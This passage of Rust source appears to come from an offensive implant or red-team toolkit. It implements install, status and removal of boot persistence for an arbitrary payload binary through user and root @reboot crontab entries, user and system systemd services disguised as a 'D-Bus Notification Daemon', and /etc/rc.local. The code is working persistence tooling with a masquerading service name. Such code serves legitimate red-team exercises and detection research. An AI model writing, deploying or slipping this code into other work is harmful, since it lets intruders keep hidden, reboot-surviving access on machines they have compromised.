    // ── cron-reboot ───────────────────────────────────────────────────────────

    fn status_cron_reboot() -> String {
        let cron_ok = read_crontab(false).iter().any(|l| l.contains(CRON_MARKER));
        let file_ok = persist_payload().exists();
        let p = persist_payload();
        if cron_ok && file_ok {
            format!("ACTIVE: cron-reboot\n  Cron: @reboot entry present\n  Payload: {} (exists)", p.display())
        } else if cron_ok {
            "PARTIAL: cron-reboot — cron entry present but payload missing".to_string()
        } else if file_ok {
            format!("PARTIAL: cron-reboot — payload exists ({}) but no cron entry", p.display())
        } else {
            "NOT INSTALLED: cron-reboot".to_string()
        }
    }

    fn install_cron_reboot(blob_path: &str) -> String {
        let dest = match ensure_binary(blob_path) {
            Ok(d) => d,
            Err(e) => return e,
        };
        let lines = read_crontab(false);
        if lines.iter().any(|l| l.contains(CRON_MARKER)) {
            return "OK: cron-reboot already installed".to_string();
        }
        let mut new_cron = lines.join("\n");
        if !new_cron.ends_with('\n') && !new_cron.is_empty() { new_cron.push('\n'); }
        new_cron.push_str(&format!("@reboot {} {}\n", dest.display(), CRON_MARKER));
        match write_crontab(&new_cron, false) {
            Ok(_) => format!(
                "OK: cron-reboot installed\n  Payload: {}\n  Trigger: @reboot (user crontab)\nARTIFACT:persist_payload:{}\nARTIFACT:persist_cron:@reboot {}",
                dest.display(), dest.display(), dest.display()
            ),
            Err(e) => format!("ERROR: cron-reboot — failed to write crontab: {}", e),
        }
    }

    fn remove_cron_reboot() -> String {
        let p = persist_payload();
        let lines = read_crontab(false);
        let filtered: Vec<_> = lines.iter().filter(|l| !l.contains(CRON_MARKER)).cloned().collect();
        let _ = write_crontab(&filtered.join("\n"), false);
        let _ = std::fs::remove_file(&p);
        let _ = std::fs::remove_dir(persist_dir());
        format!(
            "OK: cron-reboot removed\nARTIFACT_REMOVED:persist_payload:{}\nARTIFACT_REMOVED:persist_cron:@reboot {}",
            p.display(), p.display()
        )
    }

    // ── systemd-user ──────────────────────────────────────────────────────────

    fn status_systemd_user() -> String {
        let svcfile = home_dir().join(".config/systemd/user")
            .join(format!("{}.service", PERSIST_SVC));
        let file_ok = svcfile.exists();
        let enab_ok = systemctl_is_enabled(PERSIST_SVC, true);
        if file_ok && enab_ok {
            format!("ACTIVE: systemd-user\n  Service: {} (exists, enabled)", svcfile.display())
        } else if file_ok {
            format!("PARTIAL: systemd-user — service file present but not enabled\n  Service: {}", svcfile.display())
        } else if enab_ok {
            "PARTIAL: systemd-user — enabled but service file missing".to_string()
        } else {
            "NOT INSTALLED: systemd-user".to_string()
        }
    }

    fn install_systemd_user(blob_path: &str) -> String {
        let dest = match ensure_binary(blob_path) {
            Ok(d) => d,
            Err(e) => return e,
        };
        let svcdir  = home_dir().join(".config/systemd/user");
        let svcfile = svcdir.join(format!("{}.service", PERSIST_SVC));
        let _ = std::fs::create_dir_all(&svcdir);
        let unit = format!(
            "[Unit]\nDescription=D-Bus Notification Daemon\nAfter=network.target\n\n\
             [Service]\nType=simple\nExecStart={}\nRestart=on-failure\nRestartSec=60\n\n\
             [Install]\nWantedBy=default.target\n", dest.display()
        );
        if let Err(e) = std::fs::write(&svcfile, unit) {
            return format!("ERROR: write {}: {}", svcfile.display(), e);
        }
        let _ = std::process::Command::new("systemctl").args(["--user", "daemon-reload"]).status();
        let _ = std::process::Command::new("systemctl").args(["--user", "enable", PERSIST_SVC]).status();
        let linger_note = if std::process::Command::new("loginctl")
            .args(["enable-linger", &std::env::var("USER").unwrap_or_default()])
            .status().map(|s| s.success()).unwrap_or(false)
        { "\n  Linger: enabled — fires at boot" } else { "\n  WARN: loginctl enable-linger requires root — fires at logon only" };
        format!(
            "OK: systemd-user installed\n  Service: {}\n  Payload: {}{}\nARTIFACT:persist_payload:{}\nARTIFACT:persist_svc:{}",
            svcfile.display(), dest.display(), linger_note, dest.display(), svcfile.display()
        )
    }

    fn remove_systemd_user() -> String {
        let svcfile = home_dir().join(".config/systemd/user")
            .join(format!("{}.service", PERSIST_SVC));
        let _ = std::process::Command::new("systemctl").args(["--user", "stop",    PERSIST_SVC]).status();
        let _ = std::process::Command::new("systemctl").args(["--user", "disable", PERSIST_SVC]).status();
        let _ = std::fs::remove_file(&svcfile);
        let _ = std::process::Command::new("systemctl").args(["--user", "daemon-reload"]).status();
        let p = persist_payload();
        let _ = std::fs::remove_file(&p);
        let _ = std::fs::remove_dir(persist_dir());
        format!(
            "OK: systemd-user removed\nARTIFACT_REMOVED:persist_payload:{}\nARTIFACT_REMOVED:persist_svc:{}",
            p.display(), svcfile.display()
        )
    }

    // ── systemd-system (root) ─────────────────────────────────────────────────

    fn status_systemd_system() -> String {
        let svcfile = PathBuf::from(format!("/etc/systemd/system/{}.service", PERSIST_SVC));
        let file_ok = svcfile.exists();
        let enab_ok = systemctl_is_enabled(PERSIST_SVC, false);
        if file_ok && enab_ok {
            format!("ACTIVE: systemd-system\n  Service: {} (exists, enabled)", svcfile.display())
        } else if file_ok {
            format!("PARTIAL: systemd-system — service file present but not enabled\n  Service: {}", svcfile.display())
        } else if enab_ok {
            "PARTIAL: systemd-system — enabled but service file missing".to_string()
        } else {
            "NOT INSTALLED: systemd-system".to_string()
        }
    }

    fn install_systemd_system(blob_path: &str) -> String {
        if !is_root() { return "ERROR: systemd-system requires root".to_string(); }
        let dest = match ensure_binary(blob_path) {
            Ok(d) => d,
            Err(e) => return e,
        };
        let svcfile = PathBuf::from(format!("/etc/systemd/system/{}.service", PERSIST_SVC));
        let user = std::env::var("USER").unwrap_or_else(|_| "root".to_string());
        let unit = format!(
            "[Unit]\nDescription=D-Bus Notification Daemon\nAfter=network.target\n\n\
             [Service]\nType=simple\nUser={}\nExecStart={}\nRestart=on-failure\nRestartSec=60\n\n\
             [Install]\nWantedBy=multi-user.target\n", user, dest.display()
        );
        if let Err(e) = std::fs::write(&svcfile, unit) {
            return format!("ERROR: write {}: {}", svcfile.display(), e);
        }
        let _ = std::process::Command::new("systemctl").arg("daemon-reload").status();
        let _ = std::process::Command::new("systemctl").args(["enable", PERSIST_SVC]).status();
        format!(
            "OK: systemd-system installed\n  Service: {}\n  User: {}\n  Payload: {}\n  Trigger: boot (multi-user.target)\nARTIFACT:persist_payload:{}\nARTIFACT:persist_svc:{}",
            svcfile.display(), user, dest.display(), dest.display(), svcfile.display()
        )
    }

    fn remove_systemd_system() -> String {
        if !is_root() { return "ERROR: systemd-system requires root".to_string(); }
        let svcfile = PathBuf::from(format!("/etc/systemd/system/{}.service", PERSIST_SVC));
        let _ = std::process::Command::new("systemctl").args(["stop",    PERSIST_SVC]).status();
        let _ = std::process::Command::new("systemctl").args(["disable", PERSIST_SVC]).status();
        let _ = std::fs::remove_file(&svcfile);
        let _ = std::process::Command::new("systemctl").arg("daemon-reload").status();
        let p = persist_payload();
        let _ = std::fs::remove_file(&p);
        let _ = std::fs::remove_dir(persist_dir());
        format!(
            "OK: systemd-system removed\nARTIFACT_REMOVED:persist_payload:{}\nARTIFACT_REMOVED:persist_svc:{}",
            p.display(), svcfile.display()
        )
    }

    // ── rc-local (root) ───────────────────────────────────────────────────────

    fn status_rc_local() -> String {
        let rc = std::path::Path::new("/etc/rc.local");
        if std::fs::read_to_string(rc).unwrap_or_default().contains(RC_MARKER) {
            format!("ACTIVE: rc-local\n  Entry in /etc/rc.local present\n  Payload: {}", persist_payload().display())
        } else if persist_payload().exists() {
            format!("PARTIAL: rc-local — payload exists ({}) but not in /etc/rc.local", persist_payload().display())
        } else {
            "NOT INSTALLED: rc-local".to_string()
        }
    }

    fn install_rc_local(blob_path: &str) -> String {
        if !is_root() { return "ERROR: rc-local requires root".to_string(); }
        let dest = match ensure_binary(blob_path) {
            Ok(d) => d,
            Err(e) => return e,
        };
        let rc_path = std::path::Path::new("/etc/rc.local");
        if !rc_path.exists() {
            let _ = std::fs::write(rc_path, "#!/bin/bash\n# rc.local\nexit 0\n");
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(rc_path, std::fs::Permissions::from_mode(0o755));
        }
        let content = std::fs::read_to_string(rc_path).unwrap_or_default();
        if content.contains(RC_MARKER) {
            return "OK: rc-local already installed".to_string();
        }
        let entry = format!("{} {}", dest.display(), RC_MARKER);
        let new_content = if content.contains("exit 0") {
            content.replace("exit 0", &format!("{}\nexit 0", entry))
        } else {
            format!("{}\n{}\n", content.trim_end(), entry)
        };
        match std::fs::write(rc_path, new_content) {
            Ok(_) => format!(
                "OK: rc-local installed\n  Payload: {}\n  Trigger: /etc/rc.local (boot)\nARTIFACT:persist_payload:{}",
                dest.display(), dest.display()
            ),
            Err(e) => format!("ERROR: write /etc/rc.local: {}", e),
        }
    }

    fn remove_rc_local() -> String {
        if !is_root() { return "ERROR: rc-local requires root".to_string(); }
        if let Ok(content) = std::fs::read_to_string("/etc/rc.local") {
            let filtered: String = content.lines()
                .filter(|l| !l.contains(RC_MARKER))
                .map(|l| format!("{}\n", l))
                .collect();
            let _ = std::fs::write("/etc/rc.local", filtered);
        }
        let p = persist_payload();
        let _ = std::fs::remove_file(&p);
        let _ = std::fs::remove_dir(persist_dir());
        format!("OK: rc-local removed\nARTIFACT_REMOVED:persist_payload:{}", p.display())
    }

    // ── cron-system (root) ────────────────────────────────────────────────────

    fn status_cron_system() -> String {
        if read_crontab(true).iter().any(|l| l.contains(CRON_MARKER)) {
            format!("ACTIVE: cron-system\n  Root @reboot entry present\n  Payload: {}", persist_payload().display())
        } else {
            "NOT INSTALLED: cron-system".to_string()
        }
    }

    fn install_cron_system(blob_path: &str) -> String {
        if !is_root() { return "ERROR: cron-system requires root".to_string(); }
        let dest = match ensure_binary(blob_path) {
            Ok(d) => d,
            Err(e) => return e,
        };
        let lines = read_crontab(true);
        if lines.iter().any(|l| l.contains(CRON_MARKER)) {
            return "OK: cron-system already installed".to_string();
        }
        let mut new_cron = lines.join("\n");
        if !new_cron.ends_with('\n') && !new_cron.is_empty() { new_cron.push('\n'); }
        new_cron.push_str(&format!("@reboot {} {}\n", dest.display(), CRON_MARKER));
        match write_crontab(&new_cron, true) {
            Ok(_) => format!(
                "OK: cron-system installed\n  Payload: {}\n  Trigger: root @reboot\nARTIFACT:persist_payload:{}",
                dest.display(), dest.display()
            ),
            Err(e) => format!("ERROR: cron-system — failed to write root crontab: {}", e),
        }
    }

    fn remove_cron_system() -> String {
        if !is_root() { return "ERROR: cron-system requires root".to_string(); }
        let lines = read_crontab(true);
        let filtered: Vec<_> = lines.iter().filter(|l| !l.contains(CRON_MARKER)).cloned().collect();
        let _ = write_crontab(&filtered.join("\n"), true);
        let p = persist_payload();
        let _ = std::fs::remove_file(&p);
        let _ = std::fs::remove_dir(persist_dir());
        format!("OK: cron-system removed\nARTIFACT_REMOVED:persist_payload:{}", p.display())
    }
}
